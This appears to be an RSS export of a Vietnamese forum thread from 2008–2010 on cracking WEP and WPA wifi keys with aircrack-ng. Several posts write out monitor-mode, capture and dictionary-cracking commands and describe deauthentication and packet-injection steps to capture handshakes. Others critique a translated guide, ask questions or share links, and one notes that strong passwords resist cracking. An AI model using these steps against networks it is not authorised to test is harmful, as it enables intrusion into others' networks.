+                                &#40;monitor mode enabled on mon0&#41;</pre>
+		</div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134618</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#134618</link>
+				<pubDate><![CDATA[Sat, 7 Jun 2008 21:52:34]]> GMT</pubDate>
+				<author><![CDATA[ quanta]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ hack wifi chả dễ tí nào! Làm rất mệt ( tớ chưa thành công bao giờ cả)!
+Mà còn tuỳ loại card của mình nữa, phải xem phần mềm có hỗ trợ card đó hay không, nếu không thì cũng...vứt!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#135693</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#135693</link>
+				<pubDate><![CDATA[Sun, 15 Jun 2008 17:38:53]]> GMT</pubDate>
+				<author><![CDATA[ dangkita]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ cám ơn mọi người đã quan tâm chăm sóc .
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#135708</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#135708</link>
+				<pubDate><![CDATA[Sun, 15 Jun 2008 20:09:26]]> GMT</pubDate>
+				<author><![CDATA[ tranduyninh]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ tranduyninh wrote:
+
+
+    ...
+    cái này đúng là copy thật nhưng tiếng anh &gt; tiếng việt cũng có công ha .
+      
+
+
+Đúng là cũng có công thật. Nhưng, tôi nghĩ như này sẽ hay hơn:
+Từ bài viết đó, bạn nên đọc để hiểu và thực hành trên một môi trường thật, sau đó ghi lại và giải thích các bước chính. Như thế ít ra bạn còn thu được kiến thức gì đó.
+
+Tôi hỏi bạn vài câu:
+1. Đoạn này của bạn có chạy được không?
+
+tranduyninh wrote:
+
+
+    bước 1: chuyển wireless card qua chế độ monitor
+    Code:
+
+     ifconfig ath0 up
+     iwconfig ath0 mode monitor
+     
+
+
+      
+
+
+(Đã nhắc sửa eth0 thành ath0 nhưng cũng không sửa)
+
+2. Tại sao bạn không dùng airmon-ng để chuyển wireless card sang chế độ monitor:
+Code:
+
+# airmon-ng start ath0
+
+
+
+3.
+
+tranduyninh wrote:
+
+
+    bước 2 : run airodum-ng để collect authentical :
+
+    Code:
+
+    airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0
+
+
+    *
+    -c 9 is chanel của network
+    - -bssid 00:14:6C:7E:40:80 is the access point MAC address.
+    -w psk file sẽ lưu IVs
+    ath0 is the interface name.
+      
+
+
+tranduyninh wrote:
+
+
+    cuối cùng run aircrack-ng để crack :
+    Code:
+
+    aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk.cap
+
+
+    psk.cap là file capture ở trên
+    password.lst : đường dẫn đến file chứa password trong ổ cứng ( có thể là password.txt)
+      
+
+
+"psk" là cái gì? Tại sao ở trên chỉ có -w psk, còn ở dưới "file capture" lại là psk.cap?
+
+Tóm lại, tôi có một góp ý là bạn nên "thử" thực hiện bài hướng dẫn này trên môi trường thật. Sau đó sửa lại bài viết, chú ý định dạng cho cẩn thận. Nếu không, tôi đành dời nó vào Trash. Cảm ơn.
+
+
+
+Mình nghĩ bạn ấy tuy copy,nhưng quá trình mình thấy cũng okie đấy chứ
+ airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0  =&gt;&gt;&gt; psk là cái tên file nguoi crack đặt,và file ra sẽ có đuôi psk.cap,đó la default .=&gt; "psk" là cái gì? Tại sao ở trên chỉ có -w psk, còn ở dưới "file capture" lại là psk.cap?.Đây là câu trả lời cho bạn tranduyninh
+thân chào
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#136991</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#136991</link>
+				<pubDate><![CDATA[Sun, 22 Jun 2008 23:44:04]]> GMT</pubDate>
+				<author><![CDATA[ helllove]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Cái này là crack WEP-key 64 bit chứ WPA nỗi gì.
+Nếu muốn Crack WEP-key nhanh không tốn nhiều công sức thì tham khào trang này.
+http://thegioimang.org/forum/showthread.php?t=394 
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#137479</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#137479</link>
+				<pubDate><![CDATA[Tue, 24 Jun 2008 20:46:46]]> GMT</pubDate>
+				<author><![CDATA[ hanjyung]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">hanjyung wrote:</cite><br>
+		<blockquote>Cái này là crack WEP-key 64 bit chứ WPA nỗi gì.
+Nếu muốn Crack WEP-key nhanh không tốn nhiều công sức thì tham khào trang này.<span class="link"> http://thegioimang.org/forum/showthread.php?t=394</span> 
+&nbsp;
+		</blockquote>
+Cái "này" là cái nào? Bạn đọc <span class="link"> http://www.aircrack-ng.org/doku.php?id=cracking_wpa</span> chưa?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#137483</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#137483</link>
+				<pubDate><![CDATA[Tue, 24 Jun 2008 20:57:11]]> GMT</pubDate>
+				<author><![CDATA[ quanta]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Một hướng dẫn về thiết lập mô hình tấn công wireless khá đầy đủ http://my.opera.com/thuynt/blog/2008/05/22/ky-thuat-do-khoa-wep-cua-mang-wifi-step-by-step
+
+Trên mạng có rất nhiều video mô tả quá trình tấn công vào mạng wireless nhưng cái nì Cracking a 128 Bit Wep key(auditor) là dễ hiểu nhất. Một số cái khác thì cũng cùng bản chất nhưng có thể dùng tool khác , và môi trường khác.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#137639</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#137639</link>
+				<pubDate><![CDATA[Wed, 25 Jun 2008 11:30:24]]> GMT</pubDate>
+				<author><![CDATA[ vikjava]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Sặc !!! Cái này vừa thử ở cơ quan xong ! Coi theo bài gốc của aircrack-ng.org (chứ ko phải cái bài dịch cẩu thả ở trên) nhưng kết quả dù có cùng lúc 5-6 clients kết nối để auth vẫn không dò ra password. Bởi vì pass được dò trong file password.lst. Dò mãi ko ra nhưng khi tôi copy cái password của mình bỏ vào trong file ấy thì nó dò ra ngay ! Như vậy có thể kết luận chỉ cần đặt 1 password mạnh là có thể an tâm không bị dò ra !
+
+Nhân đây cũng có 1 thắc mắc nhỏ, ở quá trình dò pass trên file, cái aircrack chỉ dò ở khoảng 200 dòng đầu của file password.lst, dù trong file có mấy ngàn dòng ? Các bạn cho biết lý do tại sao nhé !
+
+Thân !]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#169685</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#169685</link>
+				<pubDate><![CDATA[Mon, 16 Feb 2009 17:44:05]]> GMT</pubDate>
+				<author><![CDATA[ TheShinichi]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Quan trọng la bạn crack WEP hay la WPA2 . WPA2 thì hên xui, vì nó crack chủ yếu - dictionary , bruteforce. 
+
+<b>@the shinichi:</b>
+Mình chỉ dùng airolib complie cái file password lại thì aircrack nó sẽ nhanh hơn rất nhiều ( khoảng 60k words/s trở lên +pyrit). Còn cái file password đào đâu ra thì 1 là dùng MD5 harsh ra , 2 là down về cho gọn ( có cai rainbow table 33gb : 1mil words, 1k+ essid)  Còn để file txt dò thì rất chậm khoảng 300 - 500 words/s .
+
+<blockquote> <b>Hanjyung có nói: </b>
+Cái này là crack WEP-key 64 bit chứ WPA nỗi gì.
+Nếu muốn Crack WEP-key nhanh không tốn nhiều công sức thì tham khào trang này.<span class="link"> http://thegioimang.org/forum/showthread.php?t=394</span> &nbsp;
+		</blockquote>
+bạn thật là TÀI...  thấy 4-way hand shake + với lại opt password file kia ko...
+Còn về window crack wifi thì 1 câu thôi " Wang nó đi, phí thời gian" 
+
+
+<b>@tranduyminh: </b>
+mình xin chỉnh lại cho bạn 1 tí 
+Chạy airodump-ng xong thì phai deauth 1 client để lấy những cái packet đầu  =&gt; 4way handshake. =&gt; ko có cái này ko inject hay làm j đc.
+Bạn dịch thiếu phần này sẽ gây hiểu lầm giữa crack WEP và crack WPA.
+
+<b>@helllove:</b>
+Tại vì opt -w có nghĩa write xuống theo định dạng là *.cap + 1 file .txt. Nếu bạn ko tin thì bạn có thể vào trong thư mục root/user hoặc thư mục nào bạn -w xuống. Cho nên ở lệnh aircrack-ng thì phải để psk.cap vì nó sẽ báo no diectory found nếu để psk không.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#184740</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#184740</link>
+				<pubDate><![CDATA[Fri, 26 Jun 2009 18:16:52]]> GMT</pubDate>
+				<author><![CDATA[ dq0511]]></author>
+			</item>
+			<item>
+				<title>Re: hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">tranduyninh wrote:</cite><br>
+		<blockquote>cả tuần mới có dịp lên mạng , vào hva thấy bị nhắc nhở buồn quá . cũng lưu ý các bạn là khi mình dùng cách trên với broadcom wireless thì nó cứ trơ ra .&nbsp;
+		</blockquote>
+Nếu bạn sử dụng Ubuntu thì có lẽ sẽ dễ dàng thực hiện hơn. Với wireless card Broadcom BCM43xx bạn có thể tìm driver b43-fwcutter. Mình tìm được một link hướng dẫn thêm patch cho kernel và biên dịch kernel cho Ubuntu 9.10 ở đây <span class="link"> http://hacking-library.com/forum/viewtopic.php?f=36&t=201&start=0</span>, bạn có thể làm theo hướng dẫn.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#198209</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#198209</link>
+				<pubDate><![CDATA[Fri, 13 Nov 2009 13:14:54]]> GMT</pubDate>
+				<author><![CDATA[ nhutdm]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Mình đang nghiên cứu cái Wireless Hacking nên có vài kinh nghiệm muốn chia sẻ với anh em :
+1. Muốn hack được cái pass Wireless thì phải có client nào đó đang associated với AP , và Client đó nằm trong phạm vi "bắt sóng" của card mạng của bạn (nghe giang hồ đồn là hack được ngay cả khi ko có client bằng kỹ thuật korek và fragment nhưng mình test nhiều lần rồi mà vẫn ko thành công , có thể là do mấy cái AP mới nó khắc phục được cái này)
+2. Các bước cơ bản thường là : 
+_ active cái NIC wireless (nếu nó chưa được active) 
+_ chuyển NIC qua chế độ Monitor , tùy cấu trúc phần phần cứng phần mềm mà interface của NIC wireless có tên là ath hay là wlan , và cũng tùy cấu trúc mà dùng lệnh iwconfig hoặc là airmon-ng để chuyển chế độ
+_ dùng airodump-ng (hoặc kismet) để scan mạng ko dây , rồi chỉ định cái AP cụ thể nào cần tấn công 
+_ đối với WEP : đơn giản là đợi khi nào đủ gói (đợi cái cột data nó lên trên 50K cho chắc ăn) thì dùng aircrack thịt nó , nếu thằng client ít hoạt động thì khó mà đợi cho đến khi bắt được 50K , do đó phải dùng aireplay-ng -0 "đá" nó văng ra , nó sẽ phải gởi yêu cầu reconnect , rồi dùng aireplay-ng -3 bơm ARP vào (nên phục kích -3 trước rồi mới đá bằng -0 sau) , chi tiết dùng mấy cái lệnh nào thế nào thì các bác tự kiếm nhé
+_ đối với WPA : quan trọng là bắt được cái 4-way handshake thì việc bẻ khóa mới thực hiện được. Cũng dùng aireplay-ng -0 đá nó ra , nó yêu cầu kết nối , ngay lúc đó cái sẽ chụp được cái 4-way handshake. Rồi dùng aircrack + từ điển thịt nó (hình như thằng aircrack này nó chỉ có thể dò từ khóa trong file từ điển chứ nó ko bít tổ hợp hay là bruteforce , nghĩa là trong từ điển phải có chính xác từ khóa trùng với password thì mới có kết quả)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#198316</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#198316</link>
+				<pubDate><![CDATA[Sun, 15 Nov 2009 00:39:23]]> GMT</pubDate>
+				<author><![CDATA[ luckyluke113]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ tớ thấy thầy tớ làm không đến 2 phút . i love master ... để hum nÀO đc học đến bài hack wifi sẽ bảo các pro ^^! .]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#199447</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#199447</link>
+				<pubDate><![CDATA[Sun, 29 Nov 2009 22:02:15]]> GMT</pubDate>
+				<author><![CDATA[ vodoc_90]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Demo Hack Wireless với điều kiện lý tưởng thì 2 phút là chuyện thường
+
+Làm thực tế, dò cái pass WPA có khi cả ngày cũng chưa ra đấy bạn ạ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#200486</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#200486</link>
+				<pubDate><![CDATA[Sat, 12 Dec 2009 09:04:42]]> GMT</pubDate>
+				<author><![CDATA[ luckyluke113]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ link die rôi ông anh ơi :-(]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#200504</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#200504</link>
+				<pubDate><![CDATA[Sat, 12 Dec 2009 19:34:52]]> GMT</pubDate>
+				<author><![CDATA[ thankiemat5a]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Các huynh cho em hỏi em dùng http://www.aircrack-ng.org/doku.php?id=slitaz (WireShark) để lấy packets nhưng em lại không biết cách tạo KEY từ Packets. Các huynh chỉ em với
+
+Packets của em: http://tinyurl.com/yazf5ol
+
+Thanks!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#203719</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#203719</link>
+				<pubDate><![CDATA[Thu, 21 Jan 2010 23:37:47]]> GMT</pubDate>
+				<author><![CDATA[ SweatDream]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ mình thấy có đoạn flash này hướng dẫn mà chưa thử bao giờ,up lên cho anh em xem thử...mà nhờ anh em làm sao lưu hộ cái file flash này xem offline  được không
+http://www.offensive-security.com/videos/bt3teaser/bt3teaser.html]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#204425</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#204425</link>
+				<pubDate><![CDATA[Tue, 2 Feb 2010 07:26:51]]> GMT</pubDate>
+				<author><![CDATA[ niteo4]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ mình tìm trên net có cái đoạn flash này mà chưa thử làm theo bao giờ.anh em xem thử nha.mà ai lưu giùm mình cái file flash về xem offline đi,mình làm mãi mà không được
+               <span class="link"> http://www.offensive-security.com/videos/bt3teaser/bt3teaser.html</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#204426</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#204426</link>
+				<pubDate><![CDATA[Tue, 2 Feb 2010 07:30:21]]> GMT</pubDate>
+				<author><![CDATA[ niteo4]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <b>2 cái clip made by myself đây 
+(làm trong điều kiện lý tưởng)
+
+WPA
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://www.youtube.com/watch?v=hqL2efcUoVc</pre>
+		</div>
+WEP
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>http://www.youtube.com/watch?v=fIV8yh5AqrM</pre>
+		</div>
+
+</b>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#205777</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#205777</link>
+				<pubDate><![CDATA[Sun, 28 Feb 2010 08:28:31]]> GMT</pubDate>
+				<author><![CDATA[ luckyluke113]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ hay đây! tiếc là chỗ mình  ko có mạng wifi để thực hành. hic]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#205878</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#205878</link>
+				<pubDate><![CDATA[Mon, 1 Mar 2010 20:06:46]]> GMT</pubDate>
+				<author><![CDATA[ bonghonghoanggia]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ Hehe!
+Bài viết trên có thể crack được cái này: <span class="link"> http://www.hvaonline.net/hvaonline/posts/list/33419.hva</span>
+không?
+=== Ở đây bán khiên với giáo cùng với nhau. ===]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#205891</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#205891</link>
+				<pubDate><![CDATA[Mon, 1 Mar 2010 23:42:08]]> GMT</pubDate>
+				<author><![CDATA[ myquartz]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">myquartz wrote:</cite><br>
+		<blockquote>Hehe!
+Bài viết trên có thể crack được cái này: <span class="link"> http://www.hvaonline.net/hvaonline/posts/list/33419.hva</span>
+không?
+=== Ở đây bán khiên với giáo cùng với nhau. ===&nbsp;
+		</blockquote>
+
+Bó tay :). Captive portal nó còn không qua được nữa thì đừng nói tới cert.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#205936</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#205936</link>
+				<pubDate><![CDATA[Tue, 2 Mar 2010 06:25:50]]> GMT</pubDate>
+				<author><![CDATA[ nhanth87]]></author>
+			</item>
+			<item>
+				<title>hướng dẫn chi tiết tấn công một mạng wifi (wireless) </title>
+				<description><![CDATA[ <blockquote>đối với WPA : quan trọng là bắt được cái 4-way handshake thì việc bẻ khóa mới thực hiện được. Cũng dùng aireplay-ng -0 đá nó ra , nó yêu cầu kết nối , ngay lúc đó cái sẽ chụp được cái 4-way handshake. Rồi dùng aircrack + từ điển thịt nó (hình như thằng aircrack này nó chỉ có thể dò từ khóa trong file từ điển chứ nó ko bít tổ hợp hay là bruteforce , nghĩa là trong từ điển phải có chính xác từ khóa trùng với password thì mới có kết quả)&nbsp;
+		</blockquote>
+Bác nói đúng, em đã thử dùng BT3 crack theo cái guide của aircrack.org nhưng chỉ mới crack được 1 con WPA2 với pass là 123456789 thui, còn pass khó hơn thì cái password.lst của nó không có chứa.
+Nhân tiện các bác có biết cách nào để tạo cái password list theo ý mình hay bác nào có bộ từ điển xịn share cho em với. Nó hướng dẫn sử dụng cái John the ripper để tạo nhưng vào trang của nó toàn nói về unix với linux, mấy cái đó em không rành lắm :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/22387.hva#207124</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/22387.hva#207124</link>
+				<pubDate><![CDATA[Tue, 16 Mar 2010 11:19:55]]> GMT</pubDate>
+				<author><![CDATA[ geniuzzz]]></author>
+			</item>
+	</channel>
+</rss>
